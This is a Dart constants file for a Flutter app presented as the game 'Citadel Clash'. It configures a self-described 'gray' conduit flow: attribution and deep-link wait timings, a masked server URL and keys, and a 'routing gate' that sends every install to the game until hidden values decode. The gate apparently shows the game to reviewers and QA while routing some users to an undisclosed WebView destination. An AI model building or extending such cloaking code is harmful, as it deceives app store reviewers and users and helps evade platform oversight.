import '../cipher/masked.dart';

// ============================================================
// KNOBS — project-wide constants for the conduit (gray) flow
// ============================================================
// Public identity is plaintext (it is on the store listing anyway).
// Everything credential-shaped resolves through the masked store.
// Timing values are project-unique and each sits inside the range
// noted beside it.
// ============================================================

abstract final class Knobs {
  // Identity (public — mirrors the store listing / manifest / gradle).
  static const String packageId = 'com.citadelclash.citadelclashgame';
  static const String marketId = 'com.citadelclash.citadelclashgame';
  static const String title = 'Citadel Clash';

  /// iOS numeric App Store id. Android-only build → empty.
  static const String appleStoreId = '';

  // ── Timings (range noted; all project-unique) ─────────────
  /// Snooze after "Skip" on the push invite. Range 2..7 days.
  static const int pushSnoozeSeconds = 345600; // 4 days

  /// Delay before re-querying GCD on an Organic first callback. 4..12s.
  static const int organicRescueSeconds = 9;

  /// Server config POST timeout. 10..25s.
  static const int serverTimeoutSeconds = 20;

  /// First-launch wait for the install-conversion payload. 20..40s.
  static const int firstWaitSeconds = 32;

  /// Returning-launch wait for the install-conversion payload. 3..10s.
  static const int returnWaitSeconds = 8;

  /// Deep-link callback wait. 3..8s.
  static const int deepLinkWaitSeconds = 6;

  /// DNS reachability probe timeout. 4..9s (keep >= 7 for slow VPNs).
  static const int reachTimeoutSeconds = 7;

  /// Debounce before a connectivity drop routes to the no-net screen.
  /// 500..1200ms.
  static const int dropDebounceMs = 760;

  /// Bounded retries on a WebView redirect loop. 1..5.
  static const int loopRetries = 3;

  /// Cached destination freshness window. 3..14 days.
  static const int cacheLifetimeSeconds = 7 * 24 * 60 * 60;

  // ── Resolved (masked) values ──────────────────────────────
  static String get serverUrl => pullConfigUrl();
  static String get attributionKey => pullAttrKey();
  static String get firebaseNumber => pullFirebaseNo();

  static String get storeRef =>
      appleStoreId.isNotEmpty ? 'id$appleStoreId' : marketId;

  /// The routing gate stays closed (every install goes to the game)
  /// until all three masked values decode to something. On a stripped
  /// checkout the game path is always available for QA.
  static bool get gateArmed =>
      serverUrl.isNotEmpty &&
      attributionKey.isNotEmpty &&
      firebaseNumber.isNotEmpty;
}
